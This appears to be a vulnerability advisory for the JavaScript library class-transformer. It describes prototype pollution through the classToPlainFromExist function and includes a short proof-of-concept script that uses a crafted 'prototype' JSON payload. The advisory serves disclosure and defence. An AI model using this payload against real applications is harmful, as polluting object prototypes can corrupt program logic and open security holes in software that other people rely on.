# Overview

class-transformer is a Proper decorator-based transformation / serialization / deserialization of plain javascript objects to class constructors.

Affected versions of this package are vulnerable to Prototype Pollution the `classToPlainFromExist` function could be tricked into adding or modifying properties of `Object.prototype` using a `prototype` payload.

# Proof of Concept
```js
var root = require("class-transformer");
var payload = JSON.parse('{ "testProperty": "hi", "prototype" : { "status" : "pwned!" } }');

var obj = root.classToPlainFromExist(payload,{});
console.log(obj.prototype.status);
```
